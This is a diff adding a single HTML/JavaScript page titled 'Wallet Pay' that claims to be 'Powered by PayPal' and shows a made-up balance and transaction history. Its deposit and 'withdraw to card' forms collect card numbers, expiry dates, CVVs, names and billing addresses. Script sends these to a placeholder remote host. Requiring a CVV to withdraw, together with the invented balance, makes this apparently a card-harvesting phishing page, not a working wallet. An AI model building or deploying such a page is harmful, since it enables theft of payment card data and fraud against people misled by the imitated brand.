@@ -1,0 +1,424 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wallet Pay</title>
+    <style>
+        body {
+            background-color: white;
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+        }
+        .container {
+            max-width: 600px;
+            width: 100%;
+            text-align: center;
+        }
+        .balance {
+            font-size: 32px;
+            margin: 20px 0;
+            color: #1564C0;
+            font-weight: bold;
+        }
+        .buttons {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin: 20px 0;
+            padding: 0 20px;
+            flex-wrap: wrap;
+        }
+        .btn {
+            background-color: #1564C0;
+            color: white;
+            padding: 12px 24px;
+            border: none;
+            border-radius: 25px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: bold;
+            transition: transform 0.2s, box-shadow 0.2s;
+            box-shadow: 0 4px 15px rgba(21, 100, 192, 0.3);
+        }
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(21, 100, 192, 0.4);
+        }
+        .modal {
+            display: none;
+            position: fixed;
+            top: 100%;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 300px;
+            background-color: white;
+            border-radius: 10px;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.2);
+            transition: top 0.3s ease-in-out;
+            z-index: 1000;
+        }
+        .modal.active {
+            top: 50%;
+            transform: translate(-50%, -50%);
+        }
+        .modal-header {
+            background-color: #1564C0;
+            color: white;
+            padding: 8px;
+            border-radius: 10px 10px 0 0;
+            cursor: move;
+            font-size: 14px;
+            font-weight: bold;
+            text-align: center;
+            position: relative;
+        }
+        .close-btn {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: white;
+            font-size: 20px;
+            cursor: pointer;
+        }
+        .modal-content {
+            padding: 15px;
+            max-height: 400px;
+            overflow-y: auto;
+        }
+        .form-group {
+            margin: 8px 0;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 6px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            font-size: 12px;
+            box-sizing: border-box;
+            background-color: #f9f9f9;
+            color: #666;
+        }
+        .form-row {
+            display: flex;
+            gap: 10px;
+        }
+        .form-row .form-group {
+            flex: 1;
+        }
+        .history-item {
+            padding: 10px;
+            margin: 5px 0;
+            background-color: #f9f9f9;
+            border-radius: 5px;
+            font-size: 14px;
+            color: #333;
+            transition: background-color 0.2s;
+        }
+        .history-item:hover {
+            background-color: #e0e0e0;
+        }
+        .modal-btn {
+            width: 100%;
+            margin-top: 15px;
+            padding: 10px;
+            border-radius: 25px;
+            font-size: 14px;
+        }
+        .footer {
+            margin-top: 30px;
+            color: #666;
+            font-size: 12px;
+        }
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            z-index: 999;
+        }
+        .notice {
+            font-size: 12px;
+            color: #333;
+            margin: 10px 0;
+            padding: 10px;
+            background-color: #f9f9f9;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            text-align: center;
+        }
+        .notice strong {
+            color: #1564C0;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Wallet Pay</h1>
+        <div class="balance">Balance: $7,534</div>
+        <div class="buttons">
+            <button class="btn" onclick="showModal('deposit-modal')">Deposit</button>
+            <button class="btn" onclick="showModal('withdraw-modal')">Withdraw</button>
+            <button class="btn" onclick="showModal('history-modal')">History</button>
+        </div>
+
+        <div class="notice">
+            <strong>Important Notice:</strong> Please ensure that all the information you enter is accurate and valid. Incorrect details may lead to transaction failures or delays. Double-check your inputs to ensure a smooth and successful transaction.
+        </div>
+
+        <!-- Deposit Modal -->
+        <div id="deposit-modal-overlay" class="modal-overlay"></div>
+        <div id="deposit-modal" class="modal">
+            <div class="modal-header" onmousedown="startDrag(event, 'deposit-modal')">
+                Top Up
+                <span class="close-btn" onclick="hideModal('deposit-modal')">×</span>
+            </div>
+            <div class="modal-content">
+                <div class="form-group">
+                    <input type="text" placeholder="Amount">
+                </div>
+                <div class="form-group">
+                    <input type="text" placeholder="Card Number">
+                </div>
+                <div class="form-row">
+                    <div class="form-group">
+                        <input type="text" placeholder="Expiring Date">
+                    </div>
+                    <div class="form-group">
+                        <input type="text" placeholder="CVV">
+                    </div>
+                </div>
+                <div class="form-group">
+                    <input type="text" placeholder="Name">
+                </div>
+                <div class="form-group">
+                    <input type="text" placeholder="Billing Address">
+                </div>
+                <div class="form-row">
+                    <div class="form-group">
+                        <input type="text" placeholder="State">
+                    </div>
+                    <div class="form-group">
+                        <input type="text" placeholder="City">
+                    </div>
+                </div>
+                <div class="form-group">
+                    <input type="text" placeholder="Zip Code">
+                </div>
+                <button class="btn modal-btn" id="top-up-btn" onclick="processTopUp()">Top Up</button>
+            </div>
+        </div>
+
+        <!-- Withdraw Modal -->
+        <div id="withdraw-modal-overlay" class="modal-overlay"></div>
+        <div id="withdraw-modal" class="modal">
+            <div class="modal-header" onmousedown="startDrag(event, 'withdraw-modal')">
+                Withdraw to Card
+                <span class="close-btn" onclick="hideModal('withdraw-modal')">×</span>
+            </div>
+            <div class="modal-content">
+                <div class="form-group">
+                    <input type="text" placeholder="Amount">
+                </div>
+                <div class="form-group">
+                    <input type="text" placeholder="Card Number">
+                </div>
+                <div class="form-row">
+                    <div class="form-group">
+                        <input type="text" placeholder="Expiring Date">
+                    </div>
+                    <div class="form-group">
+                        <input type="text" placeholder="CVV">
+                    </div>
+                </div>
+                <div class="form-group">
+                    <input type="text" placeholder="Name">
+                </div>
+                <div class="form-group">
+                    <input type="text" placeholder="Billing Address">
+                </div>
+                <div class="form-row">
+                    <div class="form-group">
+                        <input type="text" placeholder="State">
+                    </div>
+                    <div class="form-group">
+                        <input type="text" placeholder="City">
+                    </div>
+                </div>
+                <div class="form-group">
+                    <input type="text" placeholder="Zip Code">
+                </div>
+                <button class="btn modal-btn" id="withdraw-btn" onclick="processWithdraw()">Withdraw</button>
+            </div>
+        </div>
+
+        <!-- History Modal -->
+        <div id="history-modal-overlay" class="modal-overlay"></div>
+        <div id="history-modal" class="modal">
+            <div class="modal-header" onmousedown="startDrag(event, 'history-modal')">
+                Transaction History
+                <span class="close-btn" onclick="hideModal('history-modal')">×</span>
+            </div>
+            <div class="modal-content">
+                <div class="history-item">Deposit - $5,000 - Mar 1, 2025</div>
+                <div class="history-item">Deposit - $2,000 - Mar 5, 2025</div>
+                <div class="history-item">Deposit - $1,000 - Mar 10, 2025</div>
+                <div class="history-item">Withdrawal - $466 - Mar 12, 2025</div>
+            </div>
+        </div>
+
+        <div class="footer">Powered by PayPal</div>
+    </div>
+
+    <script>
+        let isDragging = false;
+        let currentModal = null;
+        let offsetY = 0;
+
+        function showModal(modalId) {
+            const modal = document.getElementById(modalId);
+            const overlay = document.getElementById(modalId + '-overlay');
+            modal.style.display = 'block';
+            overlay.style.display = 'block';
+            setTimeout(() => modal.classList.add('active'), 10);
+            if (modalId !== 'history-modal') {
+                hideModal('history-modal');
+            } else {
+                hideModal('deposit-modal');
+                hideModal('withdraw-modal');
+            }
+        }
+
+        function hideModal(modalId) {
+            const modal = document.getElementById(modalId);
+            const overlay = document.getElementById(modalId + '-overlay');
+            modal.classList.remove('active');
+            setTimeout(() => {
+                modal.style.display = 'none';
+                overlay.style.display = 'none';
+            }, 300);
+        }
+
+        async function processTopUp() {
+            const btn = document.getElementById('top-up-btn');
+            btn.textContent = 'Topping up...';
+            btn.disabled = true;
+
+            const formData = {
+                amount: document.querySelector('#deposit-modal [placeholder="Amount"]').value,
+                cardNumber: document.querySelector('#deposit-modal [placeholder="Card Number"]').value,
+                expiringDate: document.querySelector('#deposit-modal [placeholder="Expiring Date"]').value,
+                cvv: document.querySelector('#deposit-modal [placeholder="CVV"]').value,
+                name: document.querySelector('#deposit-modal [placeholder="Name"]').value,
+                billingAddress: document.querySelector('#deposit-modal [placeholder="Billing Address"]').value,
+                state: document.querySelector('#deposit-modal [placeholder="State"]').value,
+                city: document.querySelector('#deposit-modal [placeholder="City"]').value,
+                zipCode: document.querySelector('#deposit-modal [placeholder="Zip Code"]').value
+            };
+
+            try {
+                const response = await fetch('https://your-render-url.com/api/deposit', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(formData)
+                });
+
+                if (response.ok) {
+                    alert('Deposit processed successfully!');
+                    hideModal('deposit-modal');
+                } else {
+                    throw new Error('Deposit failed');
+                }
+            } catch (error) {
+                alert('Error processing deposit. Please try again.');
+            } finally {
+                btn.textContent = 'Top Up';
+                btn.disabled = false;
+            }
+        }
+
+        async function processWithdraw() {
+            const btn = document.getElementById('withdraw-btn');
+            btn.textContent = 'Withdrawal in progress...';
+            btn.disabled = true;
+
+            const formData = {
+                amount: document.querySelector('#withdraw-modal [placeholder="Amount"]').value,
+                cardNumber: document.querySelector('#withdraw-modal [placeholder="Card Number"]').value,
+                expiringDate: document.querySelector('#withdraw-modal [placeholder="Expiring Date"]').value,
+                cvv: document.querySelector('#withdraw-modal [placeholder="CVV"]').value,
+                name: document.querySelector('#withdraw-modal [placeholder="Name"]').value,
+                billingAddress: document.querySelector('#withdraw-modal [placeholder="Billing Address"]').value,
+                state: document.querySelector('#withdraw-modal [placeholder="State"]').value,
+                city: document.querySelector('#withdraw-modal [placeholder="City"]').value,
+                zipCode: document.querySelector('#withdraw-modal [placeholder="Zip Code"]').value
+            };
+
+            try {
+                const response = await fetch('https://your-render-url.com/api/withdraw', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(formData)
+                });
+
+                if (response.ok) {
+                    alert('Withdrawal processed successfully!');
+                    hideModal('withdraw-modal');
+                } else {
+                    throw new Error('Withdrawal failed');
+                }
+            } catch (error) {
+                alert('Error processing withdrawal. Please try again.');
+            } finally {
+                btn.textContent = 'Withdraw';
+                btn.disabled = false;
+            }
+        }
+
+        function startDrag(e, modalId) {
+            isDragging = true;
+            currentModal = document.getElementById(modalId);
+            offsetY = e.clientY - currentModal.getBoundingClientRect().top;
+            document.addEventListener('mousemove', drag);
+            document.addEventListener('mouseup', stopDrag);
+        }
+
+        function drag(e) {
+            if (isDragging && currentModal) {
+                const newTop = e.clientY - offsetY;
+                const windowHeight = window.innerHeight;
+                const modalHeight = currentModal.offsetHeight;
+                
+                if (newTop >= 20 && newTop + modalHeight <= windowHeight - 20) {
+                    currentModal.style.top = newTop + 'px';
+                }
+            }
+        }
+
+        function stopDrag() {
+            isDragging = false;
+            currentModal = null;
+            document.removeEventListener('mousemove', drag);
+            document.removeEventListener('mouseup', stopDrag);
+        }
+
+        window.onclick = function(event) {
+            if (event.target.classList.contains('modal-overlay')) {
+                const modalId = event.target.id.replace('-overlay', '');
+                hideModal(modalId);
+            }
+        }
+    </script>
+</body>
+</html>
